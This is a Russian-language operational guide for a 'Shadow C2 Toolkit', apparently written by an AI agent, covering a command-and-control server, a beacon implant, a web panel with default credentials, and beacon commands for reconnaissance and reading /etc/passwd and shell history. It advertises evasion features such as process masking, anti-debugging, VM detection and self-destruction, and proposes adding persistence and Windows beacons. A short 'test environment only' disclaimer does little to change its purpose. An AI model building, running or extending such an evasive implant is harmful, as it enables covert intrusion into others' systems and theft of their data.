# Shadow C2 Toolkit - Operational Guide

## 🚀 **Быстрый запуск (1 команда)**

```bash
cd /mnt/okcomputer/output && python3 quick_start.py
```

Это запустит:
- ✅ C2-сервер
- ✅ Маяк (beacon)  
- ✅ Веб-интерфейс
- ✅ Автоматически откроет браузер

## 📋 **Основные возможности**

### **Веб-интерфейс**
- **Дашборд**: http://localhost:8080/dashboard
- **Управление маяками**: http://localhost:8080/beacons
- **Авторизация**: admin / shadowc2

### **Функции управления**
1. **Просмотр маяков** - статус, IP, последняя активность
2. **Отправка команд** - выполнение команд на удаленной системе
3. **Мониторинг** - real-time отслеживание активности
4. **Безопасность** - шифрование, anti-forensics

### **Типы команд**
```bash
# Системные команды
whoami
hostname
ls -la /etc
cat /etc/passwd

# Сетевая разведка
netstat -an
ss -tulpn
ip route

# Информация о системе
uname -a
ps aux
df -h
```

## 🔒 **Безопасность**

### **Активированные функции**
- ✅ **Шифрование памяти** - защита данных
- ✅ **Маскировка процессов** - скрытие от пользователя
- ✅ **Anti-debugging** - защита от анализа
- ✅ **Обнаружение VM** - эвакуация из песочницы
- ✅ **Самоуничтожение** - при обнаружении угрозы

### **Рекомендации по безопасности**
1. **Сменить пароли** по умолчанию
2. **Использовать TLS** для продакшена
3. **Мониторить логи** безопасности
4. **Регулярные обновления**

## 🛠️ **Расширенное использование**

### **Масштабирование**
```bash
# Несколько маяков
./advanced_stager &
./advanced_stager &
./advanced_stager &
```

### **Настройка интервала**
```bash
# Проверка каждые 60 секунд
./advanced_stager --interval 60
```

### **TLS шифрование**
```bash
# Генерация сертификатов
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Запуск с TLS
python3 server/simple_server.py --tls --cert cert.pem --key key.pem
```

## 📊 **Мониторинг и логи**

### **Лог-файлы**
- `logs/security.log` - события безопасности
- `logs/alerts.log` - предупреждения
- `logs/commands.log` - история команд

### **Метрики**
- Количество активных маяков
- Частота чекинов
- Успешность команд
- Сетевой трафик

## 🎯 **Типовые операции**

### **1. Разведка**
```bash
# Информация о системе
beacon> shell uname -a
beacon> shell whoami
beacon> shell hostname

# Сетевые интерфейсы
beacon> shell ip addr show
beacon> shell netstat -rn
```

### **2. Управление файлами**
```bash
# Просмотр файлов
beacon> shell ls -la /home/
beacon> shell find / -name "*.txt" 2>/dev/null

# Чтение файлов
beacon> shell cat /etc/passwd
beacon> shell cat ~/.bash_history
```

### **3. Процессы**
```bash
# Список процессов
beacon> shell ps aux
beacon> shell top -b -n1

# Поиск процессов
beacon> shell pgrep -f "nginx"
```

## ⚠️ **Ограничения и меры предосторожности**

### **Текущие ограничения**
- Маяк работает только на Linux
- Нет автоматического persistence (требуется ручная настройка)
- Веб-интерфейс базовый (но функциональный)

### **Меры предосторожности**
- Использовать только в тестовой среде
- Не развертывать в продакшен без аудита
- Соблюдать законы и этические нормы

## 🔧 **Устранение неполадок**

### **Маяк не подключается**
1. Проверить firewall
2. Убедиться что сервер запущен
3. Проверить логи сервера

### **Команды не выполняются**
1. Проверить права пользователя
2. Убедиться что маяк активен
3. Проверить синтаксис команды

### **Веб-интерфейс недоступен**
1. Проверить порт 8080
2. Убедиться что сервер запущен
3. Проверить firewall

## 📚 **Дальнейшее обучение**

### **Рекомендуемые материалы**
- `DEPLOYMENT_GUIDE.md` - полное руководство
- `security_hardening.py` - скрипт усиления безопасности
- `src/enhanced_beacon.cpp` - код маяка для изучения

### **Возможные улучшения**
- Добавление persistence механизмов
- Расширенный веб-интерфейс
- Поддержка Windows маяков
- Автоматизация операций

---

## 🎉 **Поздравляем!**

У вас теперь есть полнофункциональная C2-система с:
- ✅ Современным веб-интерфейсом
- ✅ Продвинутыми функциями безопасности
- ✅ Богатыми возможностями управления
- ✅ Профессиональным кодом

**Команда для запуска:**
```bash
python3 quick_start.py
```

**Удачи в использовании!** 🚀